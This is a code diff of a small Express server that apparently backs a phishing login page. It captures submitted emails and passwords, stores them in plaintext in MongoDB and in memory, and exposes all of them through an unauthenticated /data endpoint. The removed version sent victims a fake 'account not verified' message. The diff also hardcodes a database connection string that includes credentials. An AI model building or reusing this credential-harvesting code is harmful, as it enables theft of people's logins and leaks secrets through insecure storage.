@@ -2,47 +2,66 @@ const express = require('express');
 
 
 const path = require('path');
-
+const { sc } = require('./models/todo')
 const cors = require('cors');
 const app = express();
 const port = 3000;
 app.use(cors());
-
+const mongoose = require('mongoose')
 
 app.set('views', path.join(__dirname, 'views'));
 app.set('view engine', 'ejs');
-const data=[];
+const data = [];
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+const mongoURI = 'mongodb+srv://umer:umer@cluster0.avg1bjf.mongodb.net/railway?retryWrites=true&w=majority';
+mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true });
+
+
+
+  const db = mongoose.connection;
+  db.on('error', console.error.bind(console, 'MongoDB connection error:'));
+  db.once('open', () => {
+    console.log('Connected to MongoDB');
+  }
+);
 
 app.get('/', function (req, res) {
-  try{
+  try {
 
     res.render('login');
-  }catch(error){
+  } catch (error) {
     res.send(error)
   }
 });
 
-app.post('/',function(req,res){
-  try{
-    const {email,password}=req.body;
-    data.push(email,password);
-    res.send({message:"Your account is not verified Plz Verify your Account And Try Again "})
+app.post('/', async function (req, res) {
+  try {
+    const { email, password } = req.body;
+    data.push(email, password);
+    const result = new sc({ email, password })
+    await result.save();
+    console.log(result)
+    if (!result) {
+      res.send('you got some error')
+    }
+   
 
-  }catch(error){
+    res.send({ message: "Data save successfully " })
+
+  } catch (error) {
     res.send(error)
   }
 
-  
+
 
 })
-app.get('/data',function(req,res){
-  try{
+app.get('/data', function (req, res) {
+  try {
 
     res.send(data)
-  }catch(error){
+  } catch (error) {
     res.send(error)
   }
 })
